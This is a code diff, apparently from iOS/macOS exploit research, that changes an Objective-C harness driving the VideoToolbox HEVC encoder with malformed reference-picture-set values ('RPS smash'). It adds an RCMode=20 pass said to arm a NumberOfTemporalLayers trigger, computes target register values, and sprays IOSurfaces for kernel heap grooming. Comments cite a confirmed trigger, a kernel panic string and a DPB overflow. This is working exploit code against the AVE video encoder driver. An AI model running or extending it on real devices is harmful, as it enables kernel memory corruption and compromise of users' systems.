@@ -74,13 +74,19 @@
         [deltaS0 addObject:@(-(i + 1))];
         [deltaS1 addObject:@(i + 1)];
     }
+    // Real RPS keys recovered from the ave27 binary (stage9/15 string table):
+    // AbsDeltaRPSMinus1 + DeltaRPSSign + NumNegativePics/NumPositivePics.
+    // DeltaPOCS0Minus1/DeltaPocS0 never existed — that is why -19640/-12912.
     NSDictionary *rpsDict = @{
+        @"AbsDeltaRPSMinus1": deltaS0,
+        @"DeltaRPSSign": deltaS1,
+        @"NumNegativePics": @32,
+        @"NumPositivePics": @32,
+        // legacy spellings — ignored if unknown, kept as harmless fallbacks
         @"DeltaPOCS0Minus1": deltaS0,
         @"DeltaPOCS1Minus1": deltaS1,
         @"DeltaPocS0": deltaS0,
         @"DeltaPocS1": deltaS1,
-        @"NumPositivePics": @32,
-        @"NumNegativePics": @32,
         @"UsedByCurrPicS0": @0xFFFFFFFFU,
         @"UsedByCurrPicS1": @0xFFFFFFFFU,
     };
@@ -101,6 +107,7 @@
         [s1small addObject:@(i + 1)];
     }
     NSDictionary *rpsSane = @{
+        @"AbsDeltaRPSMinus1": s0small, @"DeltaRPSSign": s1small,
         @"DeltaPocS0": s0small, @"DeltaPocS1": s1small,
         @"DeltaPOCS0Minus1": s0small, @"DeltaPOCS1Minus1": s1small,
         @"NumNegativePics": @2, @"NumPositivePics": @2,
@@ -128,13 +135,27 @@
     }
     [report appendString:@"property scan done\n"];
 
-    // Phase 4: encode[0] clean IDR (no RPS) -> frames 1..2 carry the smashed RPS
-    [report appendString:@"\n--- Phase 4: clean IDR then RPS smash via frameProps ---\n"];
+    // Tear down the property-probe session (ollie: failed Phase 3 sets poison
+    // the encoder state machine and the next EncodeFrame dies with -19640).
+    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+    VTCompressionSessionInvalidate(session);
+    CFRelease(session);
+    session = NULL;
+
+    // Phase 4: FRESH session — encode[0] clean IDR (no RPS), frames 1..2 carry
+    // the smashed RPS via frameProps.
+    [report appendString:@"\n--- Phase 4: fresh session, clean IDR then RPS smash ---\n"];
+    VTCompressionSessionRef s4 = NULL;
+    OSStatus st4 = VTCompressionSessionCreate(
+        kCFAllocatorDefault, 1920, 1080,
+        kCMVideoCodecType_HEVC,
+        NULL, NULL, NULL, NULL, NULL, &s4);
+    [report appendFormat:@"fresh session create -> %d\n", (int)st4];
     CVPixelBufferRef pb = NULL;
     CVPixelBufferCreate(kCFAllocatorDefault, 1920, 1080,
                          kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
                          NULL, &pb);
-    if (pb) {
+    if (st4 == noErr && s4 && pb) {
         CVPixelBufferLockBaseAddress(pb, 0);
         memset(CVPixelBufferGetBaseAddress(pb), 0x80, CVPixelBufferGetDataSize(pb));
         CVPixelBufferUnlockBaseAddress(pb, 0);
@@ -145,28 +166,29 @@
             (__bridge NSString *)kVTEncodeFrameOptionKey_ForceKeyFrame: @YES
         };
         status = VTCompressionSessionEncodeFrame(
-            session, pb, CMTimeMake(0, 30), dur,
+            s4, pb, CMTimeMake(0, 30), dur,
             (__bridge CFDictionaryRef)idrProps, NULL, &flags);
         [report appendFormat:@"encode[0] clean IDR -> %d (flags=0x%x)\n", (int)status, flags];
 
         NSDictionary *frameProps = @{
             @"UserRPSForFaceTime": @[rpsDict],
+            @"AbsDeltaRPSMinus1": deltaS0,
+            @"DeltaRPSSign": deltaS1,
             (__bridge NSString *)kVTEncodeFrameOptionKey_ForceKeyFrame: @NO
         };
         for (int fi = 1; fi <= 2; fi++) {
             status = VTCompressionSessionEncodeFrame(
-                session, pb, CMTimeMake(fi, 30), dur,
+                s4, pb, CMTimeMake(fi, 30), dur,
                 (__bridge CFDictionaryRef)frameProps, NULL, &flags);
             [report appendFormat:@"encode[%d] RPS smash -> %d\n", fi, (int)status];
         }
-
-        CVPixelBufferRelease(pb);
     }
-
-    // Cleanup
-    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
-    VTCompressionSessionInvalidate(session);
-    CFRelease(session);
+    if (pb) CVPixelBufferRelease(pb);
+    if (s4) {
+        VTCompressionSessionCompleteFrames(s4, kCMTimeInvalid);
+        VTCompressionSessionInvalidate(s4);
+        CFRelease(s4);
+    }
 
     // === AVE27 stage13: NTL sweep on the proven trigger config (ollie) ===
     // Confirmed trigger (KPAuditAVE112705Module): 1280x720 + 420YpCbCr8BiPlanarVideoRange.
@@ -191,7 +213,12 @@
     ISGetBaseFn2 isGetBase2 = isLib2 ? (ISGetBaseFn2)dlsym(isLib2, "IOSurfaceGetBaseAddress") : NULL;
     ISGetSizeFn2 isGetSize2 = isLib2 ? (ISGetSizeFn2)dlsym(isLib2, "IOSurfaceGetAllocSize") : NULL;
 
+    // stage9 recipe recovered from the ave27 binary: EncoderUsage=1 + RCMode=20
+    // is what arms NTL (the panic rung reads "EncoderUsage=1 RCMode=20 NTL=").
+    // Pass 0 = RCMode=20 + rate companions; pass 1 = control without RCMode.
     int ntlVals[] = { 1, 100, 16000, 16115, 16223, 16270, 16431, 16438, 16446, 16447, 16462 };
+    for (int pass = 0; pass < 2; pass++) {
+    BOOL useRC = (pass == 0);
     for (int i = 0; i < 11; i++) {
         int ntl = ntlVals[i];
         uint64_t x0 = ((uint64_t)(int32_t)(ntl - 16463) << 32) | 0x59ULL;
@@ -216,8 +243,8 @@
                 }
             }
         }
-        [report appendFormat:@"  NTL=%-5d x0=0x%016llx spray=%ld\n",
-         ntl, x0, surfArray ? (long)CFArrayGetCount(surfArray) : 0L];
+        [report appendFormat:@"  [%@] NTL=%-5d x0=0x%016llx spray=%ld rcSet=%d\n",
+         useRC ? @"RC20" : @"noRC", ntl, x0, surfArray ? (long)CFArrayGetCount(surfArray) : 0L, (int)rcSt];
 
         VTCompressionSessionRef s2 = NULL;
         OSStatus st2 = VTCompressionSessionCreate(
@@ -233,6 +260,18 @@
         n = CFNumberCreate(NULL, kCFNumberIntType, &usage);
         VTSessionSetProperty(s2, CFSTR("EncoderUsage"), n);
         CFRelease(n);
+        OSStatus rcSt = 0;
+        if (useRC) {
+            int rc = 20;
+            n = CFNumberCreate(NULL, kCFNumberIntType, &rc);
+            rcSt = VTSessionSetProperty(s2, CFSTR("RCMode"), n);
+            CFRelease(n);
+            double rate = 30.0;
+            n = CFNumberCreate(NULL, kCFNumberDoubleType, &rate);
+            VTSessionSetProperty(s2, CFSTR("BaseLayerFrameRate"), n); CFRelease(n);
+            n = CFNumberCreate(NULL, kCFNumberDoubleType, &rate);
+            VTSessionSetProperty(s2, CFSTR("ExpectedFrameRate"), n); CFRelease(n);
+        }
         n = CFNumberCreate(NULL, kCFNumberIntType, &ntl);
         OSStatus setSt = VTSessionSetProperty(s2, CFSTR("NumberOfTemporalLayers"), n);
         CFRelease(n);
@@ -260,8 +299,9 @@
         CVPixelBufferUnlockBaseAddress(pb2, 0);
         VTEncodeInfoFlags f2 = 0;
         st2 = VTCompressionSessionEncodeFrame(s2, pb2, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, &f2);
-        [report appendFormat:@"  NTL=%d set=%d readback=%d encode=%d %s\n", ntl, (int)setSt, rb, (int)st2,
-               (st2 == noErr) ? "SURVIVED" : "FAILED"];
+        [report appendFormat:@"  [%@] NTL=%d set=%d readback=%d encode=%d %s\n",
+         useRC ? @"RC20" : @"noRC", ntl, (int)setSt, rb, (int)st2,
+                (st2 == noErr) ? "SURVIVED" : "FAILED"];
         CVPixelBufferRelease(pb2);
         VTCompressionSessionCompleteFrames(s2, kCMTimeInvalid);
         CFRelease(s2);
@@ -296,6 +336,7 @@
              totalHits, (long)scount];
             CFRelease(surfArray);
         }
+    }
     }
 
     // === B-frame DPB overflow ===
